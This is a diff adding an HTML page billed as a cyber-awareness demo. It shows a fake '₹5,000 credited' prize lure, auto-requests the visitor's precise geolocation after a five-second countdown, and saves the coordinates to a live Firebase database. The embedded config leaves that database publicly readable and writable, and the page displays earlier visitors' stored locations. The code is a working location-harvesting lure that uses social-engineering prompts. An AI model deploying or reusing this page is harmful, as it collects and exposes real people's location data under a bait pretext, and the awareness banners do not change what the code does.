@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title></title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Roboto', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0f1e 0%, #0f172a 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+            position: relative;
+        }
+
+        /* Cyber security grid pattern overlay */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 255, 0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .main-card {
+            background: rgba(10, 20, 30, 0.85);
+            backdrop-filter: blur(16px);
+            border-radius: 2.5rem;
+            width: 100%;
+            max-width: 650px;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 255, 0.2);
+            overflow: hidden;
+            transition: all 0.3s ease;
+            z-index: 2;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+        }
+
+        /* Header warning area */
+        .warning-header {
+            background: linear-gradient(95deg, #b91c1c, #ff4d1e);
+            padding: 1rem 1.5rem;
+            text-align: center;
+            border-bottom: 3px solid #ffcc00;
+        }
+
+        .warning-header h2 {
+            color: #fff;
+            font-weight: 800;
+            letter-spacing: 2px;
+            text-shadow: 0 2px 5px black;
+            font-size: 1.3rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .warning-badge {
+            background: black;
+            color: #ffcc00;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+
+        /* Prize alert - cybersecurity awareness message */
+        .prize-alert {
+            background: #1e2a3a;
+            margin: 1.5rem 1.5rem 0.5rem 1.5rem;
+            border-radius: 2rem;
+            padding: 1.5rem;
+            text-align: center;
+            border-left: 8px solid #ffaa00;
+            border-right: 8px solid #ffaa00;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            animation: pulse-glow 2s infinite;
+        }
+
+        @keyframes pulse-glow {
+            0% { box-shadow: 0 0 0 0 rgba(255, 170, 0, 0.4); border-left-color: #ffaa00; border-right-color: #ffaa00;}
+            70% { box-shadow: 0 0 0 12px rgba(255, 170, 0, 0); border-left-color: #ffdd55; border-right-color: #ffdd55;}
+            100% { box-shadow: 0 0 0 0 rgba(255, 170, 0, 0); border-left-color: #ffaa00; border-right-color: #ffaa00;}
+        }
+
+        .prize-alert h1 {
+            font-size: 2.2rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #FFD966, #FFA500);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.5rem;
+        }
+
+        .prize-amount {
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: #ffdd77;
+            text-shadow: 0 0 8px #ff9900;
+            margin: 0.3rem 0;
+        }
+
+        .cyber-warning-text {
+            background: #000000aa;
+            padding: 12px;
+            border-radius: 28px;
+            margin-top: 12px;
+            font-size: 0.85rem;
+            color: #ffbb88;
+            font-weight: 500;
+            backdrop-filter: blur(4px);
+        }
+
+        .cyber-warning-text span {
+            color: #ff5555;
+            font-weight: bold;
+        }
+
+        /* Location section */
+        .location-section {
+            padding: 1rem 1.5rem 1.5rem;
+        }
+
+        .btn-locate {
+            background: linear-gradient(95deg, #00c9ff, #00a6ff);
+            border: none;
+            width: 100%;
+            padding: 1rem;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #0a0f1e;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 6px 14px rgba(0, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-locate:hover:not(:disabled) {
+            transform: scale(0.98);
+            background: linear-gradient(95deg, #5ee0ff, #0099ff);
+        }
+
+        .btn-locate:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .auto-timer {
+            background: #0a1722cc;
+            border-radius: 60px;
+            padding: 0.5rem 1rem;
+            margin-top: 0.8rem;
+            text-align: center;
+            font-size: 0.85rem;
+            color: #0ff;
+            font-weight: bold;
+            backdrop-filter: blur(4px);
+        }
+
+        .status-area {
+            background: #00000066;
+            border-radius: 1.5rem;
+            padding: 0.9rem;
+            margin: 1rem 0;
+            font-size: 0.85rem;
+            color: #ccf4ff;
+            border-left: 4px solid cyan;
+            backdrop-filter: blur(5px);
+        }
+
+        .coord-panel {
+            background: #07141ecc;
+            border-radius: 1.4rem;
+            padding: 0.8rem;
+            margin: 1rem 0;
+        }
+
+        .coord-row {
+            background: #0b1b26;
+            border-radius: 1rem;
+            padding: 0.6rem 1rem;
+            margin: 0.6rem 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            border: 1px solid #2c6e8f;
+        }
+
+        .coord-label {
+            font-weight: bold;
+            color: #7df9ff;
+        }
+
+        .coord-value {
+            font-family: monospace;
+            background: #00000077;
+            padding: 4px 14px;
+            border-radius: 30px;
+            font-weight: 500;
+            color: white;
+        }
+
+        .firebase-badge {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #0a1722;
+            padding: 6px 12px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            margin-top: 8px;
+        }
+
+        .timestamp {
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 10px;
+            color: #a0d0ff;
+        }
+
+        .footer-note {
+            font-size: 0.7rem;
+            text-align: center;
+            padding: 0 0.5rem 1rem;
+            color: #77aacc;
+        }
+
+        .loader-icon {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #0a0f1e;
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .countdown-number {
+            font-size: 1.2rem;
+            font-weight: bold;
+            background: #000000aa;
+            display: inline-block;
+            padding: 0 8px;
+            border-radius: 30px;
+            margin-left: 6px;
+            color: #ffcc44;
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-card">
+    <div class="warning-header">
+        <h2>
+            AWARENESS 
+            <span class="warning-badge">⚠️ EDUCATIONAL DEMO</span>
+        </h2>
+    </div>
+
+    <!-- PRIZE MESSAGE: Welcome + 5000 rupees (fake reward for awareness) -->
+    <div class="prize-alert">
+        <h1>🎉 WELCOME! 🎉</h1>
+        <div class="prize-amount">₹ 5,000 CREDITED</div>
+        <div style="font-size: 1rem; color:#ffe6b3;">"You have received ₹5000 in your account"</div>
+        <div class="cyber-warning-text">
+            ⚠️ <span>⚠️ CYBER AWARENESS ALERT ⚠️</span> ⚠️<br>
+            🚨 Never share OTP / password for "prize money"! <br>
+            🚨 Legitimate banks never ask for location to give rewards.<br>
+            ✅ This demo shows how easily location data can be collected.
+        </div>
+    </div>
+
+    <!-- Location + Firebase Section -->
+    <div class="location-section">
+        <button id="getLocationBtn" class="btn-locate">
+            📍 ALLOW LOCATION & CLAIM REWARD (DEMO)
+        </button>
+        
+        <div class="auto-timer" id="autoTimerDisplay">
+            ⏳ Auto-capture in <span id="countdownSec" class="countdown-number">5</span> seconds...
+        </div>
+        
+        <div class="status-area" id="statusMsg">
+            🔐 Auto-trigger active → Location will be captured after 5 seconds for security awareness & stored in Firebase.
+        </div>
+
+        <div class="coord-panel">
+            <div class="coord-row">
+                <span class="coord-label">🌐 LATITUDE</span>
+                <span class="coord-value" id="latDisplay">—</span>
+            </div>
+            <div class="coord-row">
+                <span class="coord-label">🗺️ LONGITUDE</span>
+                <span class="coord-value" id="lngDisplay">—</span>
+            </div>
+            <div class="firebase-badge">
+                <span>🔥 Firebase Realtime DB</span>
+                <span id="firebaseStatus" style="color:#0ff;">● connected</span>
+            </div>
+            <div class="timestamp" id="lastSavedTime">
+                ⏱️ No location stored yet.
+            </div>
+        </div>
+        <div class="footer-note">
+        </div>
+    </div>
+</div>
+
+<script>
+    // ======================= FIREBASE CONFIG (USER PROVIDED) =======================
+    const firebaseConfig = {
+        apiKey: "AIzaSyDNxE0VN3dwGmKK6cpbhHTorWtJWkoAFio",
+        authDomain: "login-with-firebase-8471d.firebaseapp.com",
+        databaseURL: "https://login-with-firebase-8471d-default-rtdb.firebaseio.com",
+        projectId: "login-with-firebase-8471d",
+        storageBucket: "login-with-firebase-8471d.firebasestorage.app",
+        messagingSenderId: "230816036738",
+        appId: "1:230816036738:web:a23bf3f1ff6eb0242e019b",
+        measurementId: "G-TP6ZVFQT7K"
+    };
+    
+    // Initialize Firebase
+    let database;
+    try {
+        firebase.initializeApp(firebaseConfig);
+        database = firebase.database();
+        console.log("✅ Firebase ready, rules: read/write true");
+        document.getElementById("firebaseStatus").innerHTML = "✅ live DB";
+    } catch (err) {
+        console.error("Firebase init error", err);
+        document.getElementById("firebaseStatus").innerHTML = "⚠️ DB error";
+        document.getElementById("statusMsg").innerHTML = "⚠️ Firebase config issue, but demo continues.";
+    }
+    
+    // DOM elements
+    const getLocationBtn = document.getElementById("getLocationBtn");
+    const latDisplaySpan = document.getElementById("latDisplay");
+    const lngDisplaySpan = document.getElementById("lngDisplay");
+    const statusMsgDiv = document.getElementById("statusMsg");
+    const lastSavedTimeSpan = document.getElementById("lastSavedTime");
+    const countdownSpan = document.getElementById("countdownSec");
+    const autoTimerDiv = document.getElementById("autoTimerDisplay");
+    
+    // Flag to prevent multiple auto triggers
+    let autoTriggerExecuted = false;
+    let countdownInterval = null;
+    let isProcessing = false;   // prevent overlapping location calls
+    
+    // Helper: Save coordinates to Firebase
+    async function saveLocationToFirebase(latitude, longitude, timestamp, accuracyInfo = null) {
+        if (!database) {
+            throw new Error("Firebase DB unavailable");
+        }
+        const locationsRef = database.ref('cyber_awareness_locations');
+        const newEntryRef = locationsRef.push();
+        const locationPackage = {
+            lat: latitude,
+            lng: longitude,
+            timestamp: timestamp,
+            readableTime: new Date(timestamp).toLocaleString(),
+            accuracyMeters: accuracyInfo,
+            source: "auto_click_5sec_demo",
+            warningNote: "Educational purpose - auto captured location for awareness"
+        };
+        await newEntryRef.set(locationPackage);
+        return newEntryRef.key;
+    }
+    
+    // Core geolocation function
+    function getCurrentLocation() {
+        return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                reject(new Error("Geolocation not supported by browser."));
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: position.timestamp
+                    });
+                },
+                (geoError) => {
+                    let errorMessage = "";
+                    switch(geoError.code) {
+                        case geoError.PERMISSION_DENIED:
+                            errorMessage = "❌ Permission denied. You denied location access. For demo, we need location to show how scammers trick you.";
+                            break;
+                        case geoError.POSITION_UNAVAILABLE:
+                            errorMessage = "📍 Location unavailable. Please enable GPS/WiFi.";
+                            break;
+                        case geoError.TIMEOUT:
+                            errorMessage = "⏰ Location request timeout. Try again.";
+                            break;
+                        default:
+                            errorMessage = "Unknown geolocation error.";
+                    }
+                    reject(new Error(errorMessage));
+                },
+                { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+            );
+        });
+    }
+    
+    // Main action: get location and save to Firebase
+    async function performLocationCapture(triggerSource = "auto") {
+        if (isProcessing) {
+            console.log("Location capture already in progress, skipping.");
+            return;
+        }
+        
+        isProcessing = true;
+        // Disable button during capture
+        getLocationBtn.disabled = true;
+        const originalBtnText = getLocationBtn.innerHTML;
+        getLocationBtn.innerHTML = '<span class="loader-icon"></span> Capturing location...';
+        
+        try {
+            const location = await getCurrentLocation();
+            const { lat, lng, accuracy, timestamp } = location;
+            
+            // Update UI with coordinates
+            latDisplaySpan.innerHTML = lat.toFixed(7);
+            lngDisplaySpan.innerHTML = lng.toFixed(7);
+            
+            // Save to Firebase
+            const firebaseKey = await saveLocationToFirebase(lat, lng, timestamp, accuracy);
+            const formattedTime = new Date(timestamp).toLocaleString();
+            lastSavedTimeSpan.innerHTML = `✅ Saved to Firebase at ${formattedTime} (ID: ${firebaseKey.slice(-6)})`;
+            statusMsgDiv.innerHTML = `⚠️⚠️ AWARENESS: Your location (${lat.toFixed(5)}, ${lng.toFixed(5)}) was stored in cloud database. In real scams, cybercriminals use this to appear legitimate. NEVER share location for fake rewards! ✅ Data saved with key ${firebaseKey.slice(-8)}.`;
+            
+            // Extra animation on prize card
+            const prizeBox = document.querySelector('.prize-alert');
+            if (prizeBox) {
+                prizeBox.style.transform = "scale(1.01)";
+                setTimeout(() => { if(prizeBox) prizeBox.style.transform = "scale(1)"; }, 400);
+            }
+            console.log(`[AUTO-DEMO] Location saved: ${lat}, ${lng} | key: ${firebaseKey}`);
+            
+        } catch (error) {
+            console.error("Location/Firebase error:", error);
+            let friendlyError = error.message;
+            if (friendlyError.includes("Permission denied")) {
+                friendlyError = "🔐 Location permission blocked. For cybersecurity demo, please allow location to see how easily data is harvested. Click the button manually if auto-blocked.";
+            } else if (friendlyError.includes("Firebase")) {
+                friendlyError = "Firebase write issue, but location captured locally. Check DB rules.";
+            }
+            statusMsgDiv.innerHTML = `⚠️ ${friendlyError}  |  Reminder: Never share location for monetary rewards.`;
+        } finally {
+            isProcessing = false;
+            getLocationBtn.disabled = false;
+            getLocationBtn.innerHTML = originalBtnText;
+        }
+    }
+    
+    // Function to start countdown and auto-click after 5 seconds
+    function startAutoCaptureCountdown() {
+        if (autoTriggerExecuted) return;
+        
+        let secondsLeft = 5;
+        if (countdownSpan) countdownSpan.innerText = secondsLeft;
+        
+        countdownInterval = setInterval(() => {
+            if (autoTriggerExecuted) {
+                if (countdownInterval) clearInterval(countdownInterval);
+                return;
+            }
+            secondsLeft--;
+            if (countdownSpan) countdownSpan.innerText = secondsLeft >= 0 ? secondsLeft : 0;
+            
+            if (secondsLeft <= 0) {
+                clearInterval(countdownInterval);
+                if (!autoTriggerExecuted) {
+                    autoTriggerExecuted = true;
+                    if (autoTimerDiv) autoTimerDiv.innerHTML = "🚀 Auto-capture triggered! Requesting location...";
+                    // Automatically trigger location capture after 5 seconds
+                    performLocationCapture("auto_5sec");
+                }
+            }
+        }, 1000);
+    }
+    
+    // Manual button click also works, but we also ensure that if user clicks earlier, we cancel auto to avoid double capture
+    function manualLocationHandler() {
+        if (autoTriggerExecuted && !isProcessing) {
+            // if auto already triggered, manual can still work, but we prevent duplicate auto countdown side effects.
+            performLocationCapture("manual");
+        } else if (!autoTriggerExecuted) {
+            // Cancel auto countdown to avoid double capture
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                autoTimerDiv.innerHTML = "🖱️ Manual capture triggered (auto-canceled)";
+                setTimeout(() => {
+                    if(autoTimerDiv && !autoTimerDiv.innerHTML.includes("triggered")) 
+                        autoTimerDiv.innerHTML = "✅ Action completed";
+                }, 2000);
+            }
+            autoTriggerExecuted = true; // prevent auto later
+            performLocationCapture("manual");
+        } else {
+            performLocationCapture("manual");
+        }
+    }
+    
+    // Attach event to button (manual click)
+    getLocationBtn.addEventListener("click", manualLocationHandler);
+    
+    // Load previous location from Firebase on page load
+    async function loadPreviousSavedLocation() {
+        if (!database) return;
+        try {
+            const ref = database.ref('cyber_awareness_locations');
+            const snapshot = await ref.orderByKey().limitToLast(1).once('value');
+            if (snapshot.exists()) {
+                const data = snapshot.val();
+                const latestKey = Object.keys(data)[0];
+                const latestEntry = data[latestKey];
+                if (latestEntry && typeof latestEntry.lat === 'number' && typeof latestEntry.lng === 'number') {
+                    latDisplaySpan.innerHTML = latestEntry.lat.toFixed(7);
+                    lngDisplaySpan.innerHTML = latestEntry.lng.toFixed(7);
+                    if (latestEntry.readableTime) {
+                        lastSavedTimeSpan.innerHTML = `🕒 Last captured (DB): ${latestEntry.readableTime} | key: ${latestKey.slice(-6)}`;
+                    } else if (latestEntry.timestamp) {
+                        const prevDate = new Date(latestEntry.timestamp).toLocaleString();
+                        lastSavedTimeSpan.innerHTML = `📀 Previous record: ${prevDate}`;
+                    }
+                }
+            }
+        } catch (err) {
+            console.warn("Could not fetch last location:", err);
+        }
+    }
+    
+    // Initialize: start auto countdown and load previous data
+    startAutoCaptureCountdown();
+    loadPreviousSavedLocation();
+    
+    // Add a small extra warning after page load to highlight auto-capture
+    setTimeout(() => {
+        if (!autoTriggerExecuted && statusMsgDiv) {
+            statusMsgDiv.innerHTML = "⏰ Auto-capture in progress: Allow location permission when prompted (cybersecurity demo). Your coordinates will be saved to Firebase after 5 seconds.";
+        }
+    }, 500);
+    
+    getCurrentLocation();
+    // Also handle case where the user might block location permanently, show reminder
+    // but we already handle inside performLocationCapture.
+    // Additional awareness: refresh the message to always show welcome + 5000
+    console.log("Auto-click active: page will request location after 5 seconds");
+</script>
+</body>
+</html>
